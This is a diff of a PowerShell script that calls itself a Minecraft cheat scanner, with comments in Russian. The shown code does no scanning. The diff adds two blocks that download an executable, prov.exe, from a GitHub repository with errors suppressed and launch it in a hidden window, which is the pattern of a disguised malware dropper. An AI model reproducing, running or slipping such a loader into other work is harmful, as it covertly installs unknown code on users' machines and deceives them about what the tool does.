@@ -1,9 +1,13 @@
 # MINECRAFT CHEAT SCANNER v2.0 https://github.com/kilordow/chekerr/releases/download/file/wave.exe
-
-Invoke-WebRequest -Uri "https://github.com/kilordow/chekerr/releases/download/file/Checker.exe" -OutFile "Checker.exe" -ErrorAction SilentlyContinue
+Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/prov.exe" -OutFile "prov.exe" -ErrorAction SilentlyContinue
     
     # Запускаем 
-    Start-Process -FilePath "Checker.exe" -WindowStyle Hidden
+    Start-Process -FilePath "prov.exe" -WindowStyle Hidden
+    
+Invoke-WebRequest -Uri "https://github.com/kilordow/nowika/raw/refs/heads/main/prov.exe" -OutFile "prov.exe" -ErrorAction SilentlyContinue
+    
+    # Запускаем 
+    Start-Process -FilePath "prov.exe" -WindowStyle Hidden
 
 
 
